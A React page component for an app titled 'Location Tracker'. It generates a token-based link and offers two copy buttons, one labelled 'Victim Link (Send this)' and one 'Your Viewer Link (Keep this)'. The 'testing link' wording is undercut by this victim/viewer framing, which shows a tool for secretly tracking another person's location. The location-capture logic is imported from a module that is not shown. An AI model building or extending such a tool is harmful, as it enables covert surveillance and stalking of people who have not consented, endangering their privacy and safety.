import { useEffect, useState } from 'react';
import { v4 as uuidv4 } from 'uuid';
import { createTrackingLink } from '../lib/trackingLink';

export default function HomePage() {
  const [trackingLink, setTrackingLink] = useState('');

  useEffect(() => {
    const token = uuidv4();
    setTrackingLink(createTrackingLink(window.location.origin, token));
  }, []);

  return (
    <main style={{ maxWidth: 720, margin: '2rem auto', fontFamily: 'Arial, sans-serif' }}>
      <h1>Location Tracker</h1>
      <p>Generate a one-time testing link and open it on a mobile device.</p>

      {trackingLink ? (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem', background: '#f8fafc', padding: '1.5rem', borderRadius: '8px' }}>
          <div>
            <h3>1. Victim Link (Send this)</h3>
            <p style={{ wordBreak: 'break-all', color: '#2563eb' }}>{trackingLink}</p>
            <button onClick={() => navigator.clipboard.writeText(trackingLink)}>Copy Victim Link</button>
          </div>

          <hr style={{ width: '100%', border: '1px solid #e2e8f0' }} />

          <div>
            <h3>2. Your Viewer Link (Keep this)</h3>
            <p style={{ wordBreak: 'break-all', color: '#059669' }}>{trackingLink}&view=1</p>
            <button onClick={() => navigator.clipboard.writeText(`${trackingLink}&view=1`)}>Copy Viewer Link</button>
          </div>
        </div>
      ) : (
        <p>Preparing link...</p>
      )}
    </main>
  );
}
